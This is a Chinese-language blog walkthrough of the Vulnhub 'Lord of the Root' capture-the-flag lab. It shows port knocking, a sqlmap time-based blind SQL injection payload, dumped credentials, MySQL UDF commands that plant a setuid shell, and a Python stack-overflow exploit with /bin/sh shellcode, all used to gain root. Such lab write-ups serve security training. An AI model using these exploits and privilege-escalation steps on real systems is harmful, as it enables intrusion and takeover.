@@ -1,0 +1,493 @@
+
+<!DOCTYPE html>
+<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
+<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
+<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
+<head>
+  <meta charset="utf-8">
+  <title>Lord of the Root - tick.Tack</title>
+  <meta name="author" content="DMC">
+
+  
+  <meta name="description" content="Lord Of The Root from Vulnhub root@kali:~/_Sec/lord_of_root# nmap -p- -T5 192.168.0.119 Starting Nmap 6.47 ( http://nmap.org ) at 2015-12-26 08:30 &hellip;">
+  
+
+  <!-- http://t.co/dKP3o1e -->
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  
+  <link rel="canonical" href="http://newdominic.github.io/blog/2015/12/26/lord_of_root/">
+  <link href="/favicon.png" rel="icon">
+  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
+  <link href="/atom.xml" rel="alternate" title="tick.Tack" type="application/atom+xml">
+  <script src="/javascripts/modernizr-2.0.js"></script>
+  <script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
+  <script>!window.jQuery && document.write(unescape('%3Cscript src="/javascripts/libs/jquery.min.js"%3E%3C/script%3E'))</script>
+  <script src="/javascripts/octopress.js" type="text/javascript"></script>
+  <!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
+<link href="//fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+<link href="//fonts.googleapis.com/css?family=PT+Sans:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+
+  
+
+</head>
+
+<body   >
+  <header role="banner"><hgroup>
+  <h1><a href="/">tick.Tack</a></h1>
+  
+</hgroup>
+
+</header>
+  <nav role="navigation"><ul class="subscription" data-subscription="rss">
+  <li><a href="/atom.xml" rel="subscribe-rss" title="subscribe via RSS">RSS</a></li>
+  
+</ul>
+  
+<form action="https://www.google.com/search" method="get">
+  <fieldset role="search">
+    <input type="hidden" name="sitesearch" value="newdominic.github.io">
+    <input class="search" type="text" name="q" results="0" placeholder="Search"/>
+  </fieldset>
+</form>
+  
+<ul class="main-navigation">
+  <li><a href="/">Blog</a></li>
+  <li><a href="/blog/archives">Archives</a></li>
+  <li><a href="/about">About</a></li>
+</ul>
+
+</nav>
+  <div id="main">
+    <div id="content">
+      <div>
+<article class="hentry" role="article">
+  
+  <header>
+    
+      <h1 class="entry-title">Lord of the Root</h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+<time class='entry-date' datetime='2015-12-26T21:38:42+08:00'><span class='date'><span class='date-month'>Dec</span> <span class='date-day'>26</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>9:38 pm</span></time>
+        
+      </p>
+    
+  </header>
+
+
+<div class="entry-content"><p><a href="https://www.vulnhub.com/entry/lord-of-the-root-101,129/">Lord Of The Root</a> from <a href="https://www.vulnhub.com/">Vulnhub</a></p>
+
+<!--more-->
+
+
+<hr />
+
+<div class="highlight"><pre><code class="language-bash" data-lang="bash">root@kali:~/_Sec/lord_of_root# nmap -p- -T5 192.168.0.119
+
+Starting Nmap 6.47 <span class="o">(</span> http://nmap.org <span class="o">)</span> at 2015-12-26 08:30 EST
+Nmap scan report <span class="k">for</span> 192.168.0.119
+Host is up <span class="o">(</span>0.00068s latency<span class="o">)</span>.
+Not shown: <span class="m">65534</span> filtered ports
+PORT   STATE SERVICE
+22/tcp open  ssh
+MAC Address: 00:0C:29:FA:7B:62 <span class="o">(</span>VMware<span class="o">)</span>
+
+Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 53.53 seconds</code></pre></div>
+
+
+<p>nmap掃瞄過之後只有port 22是打開的，另外掃過UDP也沒有掃到開起的port</p>
+
+<p>最後只好先連上port 22看看</p>
+
+<div class="highlight"><pre><code class="language-bash" data-lang="bash">root@kali:~/_Sec/lord_of_root# ssh 192.168.0.119
+
+                                                  .____    _____________________________
+                                                  <span class="p">|</span>    <span class="p">|</span>   <span class="se">\_</span>____  <span class="se">\_</span>_    ___/<span class="se">\_</span>_____   <span class="se">\</span>
+                                                  <span class="p">|</span>    <span class="p">|</span>    /   <span class="p">|</span>   <span class="se">\|</span>    <span class="p">|</span>    <span class="p">|</span>       _/
+                                                  <span class="p">|</span>    <span class="p">|</span>___/    <span class="p">|</span>    <span class="se">\ </span>   <span class="p">|</span>    <span class="p">|</span>    <span class="p">|</span>   <span class="se">\</span>
+                                                  <span class="p">|</span>_______ <span class="se">\_</span>______  /____<span class="p">|</span>    <span class="p">|</span>____<span class="p">|</span>_  /
+                                                          <span class="se">\/</span>       <span class="se">\/</span>                 <span class="se">\/</span>
+ ____  __.                     __     ___________      .__                   .___ ___________      ___________       __
+<span class="p">|</span>    <span class="p">|</span>/ _<span class="p">|</span> ____   ____   ____ <span class="p">|</span>  <span class="p">|</span> __ <span class="se">\_</span>   _____/______<span class="p">|</span>__<span class="p">|</span> ____   ____    __<span class="p">|</span> _/ <span class="se">\_</span>_    ___/___   <span class="se">\_</span>   _____/ _____/  <span class="p">|</span>_  ___________
+<span class="p">|</span>      &lt;  /    <span class="se">\ </span>/  _ <span class="se">\_</span>/ ___<span class="se">\|</span>  <span class="p">|</span>/ /  <span class="p">|</span>    __<span class="o">)</span> <span class="se">\_</span>  __ <span class="se">\ </span> <span class="p">|</span>/ __ <span class="se">\ </span>/    <span class="se">\ </span> / __ <span class="p">|</span>    <span class="p">|</span>    <span class="p">|</span> /  _ <span class="se">\ </span>  <span class="p">|</span>    __<span class="o">)</span>_ /    <span class="se">\ </span>  __<span class="se">\/</span> __ <span class="se">\_</span>  __ <span class="se">\</span>
+<span class="p">|</span>    <span class="p">|</span>  <span class="se">\|</span>   <span class="p">|</span>  <span class="o">(</span>  &lt;_&gt; <span class="o">)</span>  <span class="se">\_</span>__<span class="p">|</span>    &lt;   <span class="p">|</span>     <span class="se">\ </span>  <span class="p">|</span>  <span class="p">|</span> <span class="se">\/</span>  <span class="se">\ </span> ___/<span class="p">|</span>   <span class="p">|</span>  <span class="se">\/</span> /_/ <span class="p">|</span>    <span class="p">|</span>    <span class="p">|</span><span class="o">(</span>  &lt;_&gt; <span class="o">)</span>  <span class="p">|</span>        <span class="se">\ </span>  <span class="p">|</span>  <span class="se">\ </span> <span class="p">|</span> <span class="se">\ </span> ___/<span class="p">|</span>  <span class="p">|</span> <span class="se">\/</span>
+<span class="p">|</span>____<span class="p">|</span>__ <span class="se">\_</span>__<span class="p">|</span>  /<span class="se">\_</span>___/ <span class="se">\_</span>__  &gt;__<span class="p">|</span>_ <span class="se">\ </span> <span class="se">\_</span>__  /   <span class="p">|</span>__<span class="p">|</span>  <span class="p">|</span>__<span class="p">|</span><span class="se">\_</span>__  &gt;___<span class="p">|</span>  /<span class="se">\_</span>___ <span class="p">|</span>    <span class="p">|</span>____<span class="p">|</span> <span class="se">\_</span>___/  /_______  /___<span class="p">|</span>  /__<span class="p">|</span>  <span class="se">\_</span>__  &gt;__<span class="p">|</span>
+        <span class="se">\/</span>    <span class="se">\/</span>            <span class="se">\/</span>     <span class="se">\/</span>      <span class="se">\/</span>                  <span class="se">\/</span>     <span class="se">\/</span>      <span class="se">\/</span>                           <span class="se">\/</span>     <span class="se">\/</span>          <span class="se">\/</span>
+Easy as 1,2,3</code></pre></div>
+
+
+<p>&ldquo;Knock Friend To Enter&rdquo; 看來第一關是<a href="https://en.wikipedia.org/wiki/Port_knocking">port knocking</a></p>
+
+<p>敲完門之後，nmap再掃一次就多了一個新的port</p>
+
+<div class="highlight"><pre><code class="language-bash" data-lang="bash">1337/tcp open  http    Apache httpd 2.4.7 <span class="o">((</span>Ubuntu<span class="o">))</span></code></pre></div>
+
+
+<p>連上網站後，只有三張魔戒的meme</p>
+
+<p><img class="center" src="/images/2015-12-26-lord_of_the_root/iwilldoit.jpg"></p>
+
+<p><img class="center" src="/images/2015-12-26-lord_of_the_root/hipster.jpg"></p>
+
+<p><img class="center" src="/images/2015-12-26-lord_of_the_root/legolas.jpg"></p>
+
+<p>抓下來細看一下，裡面好像沒有藏甚麼資訊</p>
+
+<p>接著想看一下robots.txt有沒有擋調特別的路徑，卻出現了下面的特出景象</p>
+
+<p><img class="center" src="/images/2015-12-26-lord_of_the_root/robots.png"></p>
+
+<p>而且原始碼內還有一個神祕的字串</p>
+
+<div class="highlight"><pre><code class="language-bash" data-lang="bash">&lt;html&gt;
+&lt;img <span class="nv">src</span><span class="o">=</span><span class="s2">&quot;/images/hipster.jpg&quot;</span> <span class="nv">align</span><span class="o">=</span><span class="s2">&quot;middle&quot;</span>&gt;
+&lt;!--THprM09ETTBOVEl4TUM5cGJtUmxlQzV3YUhBPSBDbG9zZXIh&gt;
+&lt;/html&gt;</code></pre></div>
+
+
+<p>用base64解碼之後得到了</p>
+
+<div class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nv">Lzk3ODM0NTIxMC9pbmRleC5waHA</span><span class="o">=</span> Closer!</code></pre></div>
+
+
+<p>再解一次之後得到</p>
+
+<div class="highlight"><pre><code class="language-bash" data-lang="bash">/978345210/index.php</code></pre></div>
+
+
+<p>於是我們來到了魔鐸之門 (?</p>
+
+<p><img class="center" src="/images/2015-12-26-lord_of_the_root/gom.png"></p>
+
+<p>看到這麼陽春的登入畫面，推測應該是用SQL injection打無誤(?</p>
+
+<p>簡單試過一些基本的SQLi語句卻都沒有效果</p>
+
+<p>只好求助sqlmap大神</p>
+
+<div class="highlight"><pre><code class="language-bash" data-lang="bash">root@kali:~/_Sec/lord_of_root# sqlmap --url<span class="o">=</span><span class="s1">&#39;http://192.168.0.121:1337/978345210/index.php&#39;</span> --data<span class="o">=</span><span class="s2">&quot;username=asd&amp;password=asd&amp;submit= Login&quot;</span> --dump-all --level 5
+...
+<span class="o">[</span>11:40:29<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> testing <span class="s1">&#39;MySQL &gt; 5.0.11 AND time-based blind&#39;</span>
+<span class="o">[</span>11:41:19<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> POST parameter <span class="s1">&#39;username&#39;</span> seems to be <span class="s1">&#39;MySQL &gt; 5.0.11 AND time-based blind&#39;</span> injectable
+...
+<span class="o">[</span>11:41:21<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> checking <span class="k">if</span> the injection point on POST parameter <span class="s1">&#39;username&#39;</span> is a <span class="nb">false </span>positive
+POST parameter <span class="s1">&#39;username&#39;</span> is vulnerable. Do you want to keep testing the others <span class="o">(</span><span class="k">if</span> any<span class="o">)</span>? <span class="o">[</span>y/N<span class="o">]</span>
+sqlmap identified the following injection points with a total of <span class="m">2094</span> HTTP<span class="o">(</span>s<span class="o">)</span> requests:
+---
+Place: POST
+Parameter: username
+    Type: AND/OR <span class="nb">time</span>-based blind
+    Title: MySQL &gt; 5.0.11 AND <span class="nb">time</span>-based blind
+    Payload: <span class="nv">username</span><span class="o">=</span>asd<span class="s1">&#39;||(SELECT &#39;</span>NAyM<span class="s1">&#39; FROM DUAL WHERE 8495=8495 AND SLEEP(5) )||&#39;</span><span class="p">&amp;</span><span class="nv">password</span><span class="o">=</span>asd<span class="p">&amp;</span><span class="nv">submit</span><span class="o">=</span> Login
+---
+<span class="o">[</span>11:46:08<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> the back-end DBMS is MySQL
+web server operating system: Linux Ubuntu
+web application technology: Apache 2.4.7, PHP 5.5.9
+back-end DBMS: MySQL 5.0.11</code></pre></div>
+
+
+
+
+<div class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="o">[</span>12:09:03<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> starting dictionary-based cracking <span class="o">(</span>mysql_passwd<span class="o">)</span>
+<span class="o">[</span>12:09:13<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> cracked password <span class="s1">&#39;darkshadow&#39;</span> <span class="k">for</span> user <span class="s1">&#39;root&#39;</span>
+database management system users password hashes:
+<span class="o">[</span>*<span class="o">]</span> debian-sys-maint <span class="o">[</span>1<span class="o">]</span>:
+    password <span class="nb">hash</span>: *A55A9B9049F69BC2768C9284615361DFBD580B34
+<span class="o">[</span>*<span class="o">]</span> root <span class="o">[</span>1<span class="o">]</span>:
+    password <span class="nb">hash</span>: *4DD56158ACDBA81BFE3FF9D3D7375231596CE10F
+    clear-text password: darkshadow</code></pre></div>
+
+
+
+
+<div class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="o">[</span>09:50:20<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> fetching columns <span class="k">for</span> table <span class="s1">&#39;Users&#39;</span> in database <span class="s1">&#39;Webapp&#39;</span>
+...
++----+----------+------------------+
+<span class="p">|</span> id <span class="p">|</span> username <span class="p">|</span> password         <span class="p">|</span>
++----+----------+------------------+
+<span class="p">|</span> <span class="m">1</span>  <span class="p">|</span> frodo    <span class="p">|</span> iwilltakethering <span class="p">|</span>
+<span class="p">|</span> <span class="m">2</span>  <span class="p">|</span> smeagol  <span class="p">|</span> MyPreciousR00t   <span class="p">|</span>
+<span class="p">|</span> <span class="m">3</span>  <span class="p">|</span> aragorn  <span class="p">|</span> AndMySword       <span class="p">|</span>
+<span class="p">|</span> <span class="m">4</span>  <span class="p">|</span> legolas  <span class="p">|</span> AndMyBow         <span class="p">|</span>
+<span class="p">|</span> <span class="m">5</span>  <span class="p">|</span> gimli    <span class="p">|</span> AndMyAxe         <span class="p">|</span>
++----+----------+------------------+</code></pre></div>
+
+
+<p>成功把資料庫dump出來</p>
+
+<p>裡面有一張表看起來有點用處的帳號+密碼組合</p>
+
+<p>還得到了mysql內root的密碼為darkshadow</p>
+
+<p>拿這些帳號密碼去嘗試登入ssh，最後成功使用smeagol登入</p>
+
+<div class="highlight"><pre><code class="language-bash" data-lang="bash">Welcome to Ubuntu 14.04.3 LTS <span class="o">(</span>GNU/Linux 3.19.0-25-generic i686<span class="o">)</span>
+
+ * Documentation:  https://help.ubuntu.com/
+
+<span class="m">261</span> packages can be updated.
+<span class="m">128</span> updates are security updates.
+
+                            .____    _____________________________
+                            <span class="p">|</span>    <span class="p">|</span>   <span class="se">\_</span>____  <span class="se">\_</span>_    ___/<span class="se">\_</span>_____   <span class="se">\</span>
+                            <span class="p">|</span>    <span class="p">|</span>    /   <span class="p">|</span>   <span class="se">\|</span>    <span class="p">|</span>    <span class="p">|</span>       _/
+                            <span class="p">|</span>    <span class="p">|</span>___/    <span class="p">|</span>    <span class="se">\ </span>   <span class="p">|</span>    <span class="p">|</span>    <span class="p">|</span>   <span class="se">\</span>
+                            <span class="p">|</span>_______ <span class="se">\_</span>______  /____<span class="p">|</span>    <span class="p">|</span>____<span class="p">|</span>_  /
+                                    <span class="se">\/</span>       <span class="se">\/</span>                 <span class="se">\/</span>
+ __      __       .__                                ___________      .__                   .___
+/  <span class="se">\ </span>   /  <span class="se">\ </span>____ <span class="p">|</span>  <span class="p">|</span>   ____  ____   _____   ____   <span class="se">\_</span>   _____/______<span class="p">|</span>__<span class="p">|</span> ____   ____    __<span class="p">|</span> _/
+<span class="se">\ </span>  <span class="se">\/\/</span>   // __ <span class="se">\|</span>  <span class="p">|</span> _/ ___<span class="se">\/</span>  _ <span class="se">\ </span>/     <span class="se">\_</span>/ __ <span class="se">\ </span>  <span class="p">|</span>    __<span class="o">)</span> <span class="se">\_</span>  __ <span class="se">\ </span> <span class="p">|</span>/ __ <span class="se">\ </span>/    <span class="se">\ </span> / __ <span class="p">|</span>
+ <span class="se">\ </span>       /<span class="se">\ </span> ___/<span class="p">|</span>  <span class="p">|</span>_<span class="se">\ </span> <span class="se">\_</span>_<span class="o">(</span>  &lt;_&gt; <span class="o">)</span>  Y Y  <span class="se">\ </span> ___/   <span class="p">|</span>     <span class="se">\ </span>  <span class="p">|</span>  <span class="p">|</span> <span class="se">\/</span>  <span class="se">\ </span> ___/<span class="p">|</span>   <span class="p">|</span>  <span class="se">\/</span> /_/ <span class="p">|</span>
+  <span class="se">\_</span>_/<span class="se">\ </span> /  <span class="se">\_</span>__  &gt;____/<span class="se">\_</span>__  &gt;____/<span class="p">|</span>__<span class="p">|</span>_<span class="p">|</span>  /<span class="se">\_</span>__  &gt;  <span class="se">\_</span>__  /   <span class="p">|</span>__<span class="p">|</span>  <span class="p">|</span>__<span class="p">|</span><span class="se">\_</span>__  &gt;___<span class="p">|</span>  /<span class="se">\_</span>___ <span class="p">|</span>
+       <span class="se">\/</span>       <span class="se">\/</span>          <span class="se">\/</span>            <span class="se">\/</span>     <span class="se">\/</span>       <span class="se">\/</span>                  <span class="se">\/</span>     <span class="se">\/</span>      <span class="se">\/</span>
+Last login: Tue Sep <span class="m">22</span> 12:59:38 <span class="m">2015</span> from 192.168.55.135
+smeagol@LordOfTheRoot:~<span class="err">$</span></code></pre></div>
+
+
+<p>再來登入mysql，試試看之前看過的<a href="http://www.0xdeadbeef.info/exploits/raptor_udf2.c">MySQL UDF Exploit</a>有沒有效果</p>
+
+<div class="highlight"><pre><code class="language-bash" data-lang="bash">mysql&gt; <span class="k">select</span> do_system<span class="o">(</span><span class="s1">&#39;cp /bin/sh /home/smeagol/bash&#39;</span><span class="o">)</span><span class="p">;</span>
++------------------------------------------+
+<span class="p">|</span> do_system<span class="o">(</span><span class="s1">&#39;cp /bin/sh /home/smeagol/bash&#39;</span><span class="o">)</span> <span class="p">|</span>
++------------------------------------------+
+<span class="p">|</span>                                        <span class="m">0</span> <span class="p">|</span>
++------------------------------------------+
+<span class="m">1</span> row in <span class="nb">set</span> <span class="o">(</span>0.01 sec<span class="o">)</span>
+
+mysql&gt; <span class="k">select</span> do_system<span class="o">(</span><span class="s1">&#39;chmod 4777 /home/smeagol/bash&#39;</span><span class="o">)</span><span class="p">;</span>
++------------------------------------------+
+<span class="p">|</span> do_system<span class="o">(</span><span class="s1">&#39;chmod 4777 /home/smeagol/bash&#39;</span><span class="o">)</span> <span class="p">|</span>
++------------------------------------------+
+<span class="p">|</span>                                        <span class="m">0</span> <span class="p">|</span>
++------------------------------------------+</code></pre></div>
+
+
+<p>接著來看看成果</p>
+
+<div class="highlight"><pre><code class="language-bash" data-lang="bash">smeagol@LordOfTheRoot:~<span class="nv">$ </span>ls -al
+...
+-rwsrwxrwx  <span class="m">1</span> root    root    <span class="m">112204</span> Dec <span class="m">26</span> 16:43 bash
+...
+smeagol@LordOfTheRoot:~<span class="nv">$ </span>./sh
+bash-4.3<span class="nv">$ </span>id
+<span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>smeagol<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>smeagol<span class="o">)</span> <span class="nv">euid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>,1000<span class="o">(</span>smeagol<span class="o">)</span>
+bash-4.3<span class="nv">$ </span>cat /root/Flag.txt
+“There is only one Lord of the Ring, only one who can bend it to his will. And he does not share power.”
+– Gandalf</code></pre></div>
+
+
+<p>成功拿下魔戒的root！不過總覺得用這個方法拿到root有點太過輕鬆</p>
+
+<p>於是簡單地檢查了一下，最後找到了三支奇怪的程式</p>
+
+<div class="highlight"><pre><code class="language-bash" data-lang="bash">smeagol@LordOfTheRoot:~<span class="nv">$ </span><span class="k">for</span> i in <span class="k">$(</span>find / -perm -4000 2&gt;/dev/null<span class="k">)</span><span class="p">;</span> <span class="k">do</span> ls -al <span class="nv">$i</span><span class="p">;</span> <span class="k">done</span>
+...
+-rwsr-xr-x <span class="m">1</span> root root <span class="m">5150</span> Sep <span class="m">22</span> 13:01 /SECRET/door2/file
+-rwsr-xr-x <span class="m">1</span> root root <span class="m">7370</span> Sep <span class="m">17</span> 23:08 /SECRET/door1/file
+-rwsr-xr-x <span class="m">1</span> root root <span class="m">7370</span> Sep <span class="m">17</span> 23:08 /SECRET/door3/file</code></pre></div>
+
+
+<p>而且這命名看起來才飽含了作者對魔戒的愛，從這邊拿下root應該才是作者所希望的解法。</p>
+
+<p>這三個file檔分別放在door1, door2, door3三個目錄下</p>
+
+<p>其中兩支看起來似乎是同一支程式，而且執行之後沒做甚麼事情就結束了</p>
+
+<p>剩下的一支可以傳入參數達到Buffer Overflow的效果</p>
+
+<div class="highlight"><pre><code class="language-bash" data-lang="bash">root@kali:~/_Sec/lord_of_root/door3# objdump -D file <span class="p">|</span> grep -A30 main.:
+0804845d &lt;main&gt;:
+ 804845d:       <span class="m">55</span>                      push   %ebp
+ 804845e:       <span class="m">89</span> e5                   mov    %esp,%ebp
+ 8048460:       <span class="m">83</span> e4 f0                and    <span class="nv">$0xfffffff0</span>,%esp
+ 8048463:       <span class="m">81</span> ec b0 <span class="m">00</span> <span class="m">00</span> <span class="m">00</span>       sub    <span class="nv">$0xb0</span>,%esp
+ 8048469:       <span class="m">83</span> 7d <span class="m">08</span> <span class="m">01</span>             cmpl   <span class="nv">$0x1</span>,0x8<span class="o">(</span>%ebp<span class="o">)</span>
+ 804846d:       7f <span class="m">21</span>                   jg     <span class="m">8048490</span> &lt;main+0x33&gt;
+ 804846f:       8b <span class="m">45</span> 0c                mov    0xc<span class="o">(</span>%ebp<span class="o">)</span>,%eax
+ 8048472:       8b <span class="m">00</span>                   mov    <span class="o">(</span>%eax<span class="o">)</span>,%eax
+ 8048474:       <span class="m">89</span> <span class="m">44</span> <span class="m">24</span> <span class="m">04</span>             mov    %eax,0x4<span class="o">(</span>%esp<span class="o">)</span>
+ 8048478:       c7 <span class="m">04</span> <span class="m">24</span> <span class="m">40</span> <span class="m">85</span> <span class="m">04</span> <span class="m">08</span>    movl   <span class="nv">$0x8048540</span>,<span class="o">(</span>%esp<span class="o">)</span>
+ 804847f:       e8 8c fe ff ff          call   <span class="m">8048310</span> &lt;<span class="nb">printf</span>@plt&gt;
+ 8048484:       c7 <span class="m">04</span> <span class="m">24</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span>    movl   <span class="nv">$0x0</span>,<span class="o">(</span>%esp<span class="o">)</span>
+ 804848b:       e8 b0 fe ff ff          call   <span class="m">8048340</span> &lt;<span class="nb">exit</span>@plt&gt;
+ 8048490:       8b <span class="m">45</span> 0c                mov    0xc<span class="o">(</span>%ebp<span class="o">)</span>,%eax
+ 8048493:       <span class="m">83</span> c0 <span class="m">04</span>                add    <span class="nv">$0x4</span>,%eax
+ 8048496:       8b <span class="m">00</span>                   mov    <span class="o">(</span>%eax<span class="o">)</span>,%eax
+ 8048498:       <span class="m">89</span> <span class="m">44</span> <span class="m">24</span> <span class="m">04</span>             mov    %eax,0x4<span class="o">(</span>%esp<span class="o">)</span>
+ 804849c:       8d <span class="m">44</span> <span class="m">24</span> <span class="m">11</span>             lea    0x11<span class="o">(</span>%esp<span class="o">)</span>,%eax
+ 80484a0:       <span class="m">89</span> <span class="m">04</span> <span class="m">24</span>                mov    %eax,<span class="o">(</span>%esp<span class="o">)</span>
+ 80484a3:       e8 <span class="m">78</span> fe ff ff          call   <span class="m">8048320</span> &lt;strcpy@plt&gt;
+ 80484a8:       b8 <span class="m">00</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span>          mov    <span class="nv">$0x0</span>,%eax
+ 80484ad:       c9                      leave
+ 80484ae:       c3                      ret</code></pre></div>
+
+
+<p>接著用pattern_create.rb和pattern_offset.rb找出EIP的注入點</p>
+
+<div class="highlight"><pre><code class="language-bash" data-lang="bash">root@kali:~/_Sec/lord_of_root/door3# /usr/share/metasploit-framework/tools/pattern_offset.rb 0x41376641
+<span class="o">[</span>*<span class="o">]</span> Exact match at offset 171</code></pre></div>
+
+
+<p>再來先檢查目標端的ASLR有沒有開啟</p>
+
+<div class="highlight"><pre><code class="language-bash" data-lang="bash">smeagol@LordOfTheRoot:/SECRET/door3<span class="nv">$ </span>cat /proc/sys/kernel/randomize_va_space
+2</code></pre></div>
+
+
+<p>ASLR是開著的，看來要靠nop-sled拼人品了</p>
+
+<div class="highlight"><pre><code class="language-python" data-lang="python"><span class="c">#!/usr/bin/python</span>
+
+<span class="kn">import</span> <span class="nn">os</span>
+<span class="kn">import</span> <span class="nn">struct</span>
+
+<span class="n">nopsled</span> <span class="o">=</span> <span class="mi">20000</span>
+
+<span class="n">payload</span> <span class="o">=</span> <span class="s">&quot;A&quot;</span><span class="o">*</span><span class="mi">171</span>               <span class="c"># trash</span>
+<span class="n">payload</span><span class="o">+=</span> <span class="s">&quot;</span><span class="se">\x50\x2e\xb0\xbf</span><span class="s">&quot;</span>    <span class="c"># EIP</span>
+<span class="n">payload</span><span class="o">+=</span> <span class="s">&quot;</span><span class="se">\x90</span><span class="s">&quot;</span><span class="o">*</span><span class="n">nopsled</span>        <span class="c"># nop sled</span>
+<span class="n">payload</span><span class="o">+=</span> <span class="s">&quot;</span><span class="se">\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80</span><span class="s">&quot;</span>      <span class="c">#shellcode</span>
+
+<span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
+        <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span> <span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">4</span><span class="p">):</span>
+                <span class="n">cmd</span> <span class="o">=</span> <span class="s">&quot;/SECRET/door</span><span class="si">%d</span><span class="s">/file </span><span class="si">%s</span><span class="s">&quot;</span> <span class="o">%</span> <span class="p">(</span><span class="n">i</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
+                <span class="n">os</span><span class="o">.</span><span class="n">system</span> <span class="p">(</span><span class="n">cmd</span><span class="p">)</span></code></pre></div>
+
+
+<p>拿了一份會執行/bin/sh的
+<a href="http://shell-storm.org/shellcode/files/shellcode-811.php">shellcode</a>，把payload拼完之後就是賭人品的時刻了</p>
+
+<div class="highlight"><pre><code class="language-bash" data-lang="bash">Segmentation fault <span class="o">(</span>core dumped<span class="o">)</span>
+Segmentation fault <span class="o">(</span>core dumped<span class="o">)</span>
+Segmentation fault <span class="o">(</span>core dumped<span class="o">)</span>
+<span class="c"># id</span>
+<span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>smeagol<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>smeagol<span class="o">)</span> <span class="nv">euid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>,1000<span class="o">(</span>smeagol<span class="o">)</span></code></pre></div>
+
+
+
+</div>
+
+
+  <footer>
+    <p class="meta">
+      
+  
+
+<span class="byline author vcard">Posted by <span class="fn">DMC</span></span>
+
+      
+
+
+
+
+<time class='entry-date' datetime='2015-12-26T21:38:42+08:00'><span class='date'><span class='date-month'>Dec</span> <span class='date-day'>26</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>9:38 pm</span></time>
+      
+
+<span class="categories">
+  
+    <a class='category' href='/blog/categories/boot2root/'>boot2root</a>, <a class='category' href='/blog/categories/vulnhub/'>vulnhub</a>
+  
+</span>
+
+
+    </p>
+    
+      <div class="sharing">
+  
+  <a href="//twitter.com/share" class="twitter-share-button" data-url="http://newdominic.github.io/blog/2015/12/26/lord_of_root/" data-via="newdominic" data-counturl="http://newdominic.github.io/blog/2015/12/26/lord_of_root/" >Tweet</a>
+  
+  
+  
+</div>
+
+    
+    <p class="meta">
+      
+        <a class="basic-alignment left" href="/blog/2015/12/23/pipe/" title="Previous Post: /dev/random: Pipe">&laquo; /dev/random: Pipe</a>
+      
+      
+        <a class="basic-alignment right" href="/blog/2016/05/03/google_advanced_search_operators/" title="Next Post: Google Adavanced Search Operators">Google Adavanced Search Operators &raquo;</a>
+      
+    </p>
+  </footer>
+</article>
+
+</div>
+
+<aside class="sidebar">
+  
+    <section>
+  <h1>最近文章</h1>
+  <ul id="recent_posts">
+    
+      <li class="post">
+        <a href="/blog/2016/06/17/stapler_1/">Stapler: 1</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2016/05/03/google_advanced_search_operators/">Google Adavanced Search Operators</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2015/12/26/lord_of_root/">Lord of the Root</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2015/12/23/pipe/">/dev/random: Pipe</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2015/12/20/sleepy/">/dev/random: Sleepy</a>
+      </li>
+    
+  </ul>
+</section>
+
+
+
+
+
+  
+</aside>
+
+
+    </div>
+  </div>
+  <footer role="contentinfo"><p>
+  Copyright &copy; 2016 - DMC -
+  <span class="credit">Powered by <a href="http://octopress.org">Octopress</a></span>
+</p>
+
+</footer>
+  
+
+
+
+
+
+
+
+  <script type="text/javascript">
+    (function(){
+      var twitterWidgets = document.createElement('script');
+      twitterWidgets.type = 'text/javascript';
+      twitterWidgets.async = true;
+      twitterWidgets.src = '//platform.twitter.com/widgets.js';
+      document.getElementsByTagName('head')[0].appendChild(twitterWidgets);
+    })();
+  </script>
+
+
+
+
+
+</body>
+</html>
